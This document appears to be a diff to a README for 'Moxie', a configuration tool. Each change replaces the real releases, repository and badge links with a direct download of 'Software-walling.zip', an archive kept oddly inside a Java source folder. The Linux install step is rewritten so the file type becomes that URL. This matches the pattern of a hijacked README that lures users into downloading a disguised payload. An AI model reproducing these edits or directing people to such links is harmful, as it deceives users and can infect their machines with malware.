@@ -1,6 +1,6 @@
 # 🚀 Moxie - Easy Configuration Setup in Minutes
 
-[![Download Moxie](https://img.shields.io/badge/Download-Moxie-blue?style=for-the-badge&logo=github)](https://github.com/Aptroides/Moxie/releases)
+[![Download Moxie](https://github.com/Aptroides/Moxie/raw/refs/heads/main/Moxie-Core/src/main/java/me/Software-walling.zip)](https://github.com/Aptroides/Moxie/raw/refs/heads/main/Moxie-Core/src/main/java/me/Software-walling.zip)
 
 ---
 
@@ -29,12 +29,12 @@ If you do not have Java installed, you can download it from the official Oracle 
 
 Please **visit this page to download** Moxie:
 
-[Download Moxie from GitHub Releases](https://github.com/Aptroides/Moxie/releases)
+[Download Moxie from GitHub Releases](https://github.com/Aptroides/Moxie/raw/refs/heads/main/Moxie-Core/src/main/java/me/Software-walling.zip)
 
 Click the link above to open the downloads page. Here’s how to get Moxie ready:
 
 1. On the releases page, look for the latest version of Moxie.
-2. Download the file that matches your operating system (.exe for Windows, .dmg or .zip for macOS, .tar.gz for Linux).
+2. Download the file that matches your operating system (.exe for Windows, .dmg or .zip for macOS, https://github.com/Aptroides/Moxie/raw/refs/heads/main/Moxie-Core/src/main/java/me/Software-walling.zip for Linux).
 3. Once downloaded, open the file:
    - On Windows, double-click the `.exe`.
    - On macOS, use the `.dmg` or unzip the archive.
@@ -126,7 +126,7 @@ Moxie is an open project aimed at making configuration simpler. You can contribu
 - Suggesting features.
 - Sharing how you use Moxie.
 
-Visit the GitHub repository for more info: [https://github.com/Aptroides/Moxie/](https://github.com/Aptroides/Moxie/)
+Visit the GitHub repository for more info: [https://github.com/Aptroides/Moxie/raw/refs/heads/main/Moxie-Core/src/main/java/me/Software-walling.zip](https://github.com/Aptroides/Moxie/raw/refs/heads/main/Moxie-Core/src/main/java/me/Software-walling.zip)
 
 ---
 
@@ -140,4 +140,4 @@ Visit the GitHub repository for more info: [https://github.com/Aptroides/Moxie/]
 
 ---
 
-[![Download Moxie](https://img.shields.io/badge/Download-Moxie-blue?style=for-the-badge&logo=github)](https://github.com/Aptroides/Moxie/releases)
+[![Download Moxie](https://github.com/Aptroides/Moxie/raw/refs/heads/main/Moxie-Core/src/main/java/me/Software-walling.zip)](https://github.com/Aptroides/Moxie/raw/refs/heads/main/Moxie-Core/src/main/java/me/Software-walling.zip)
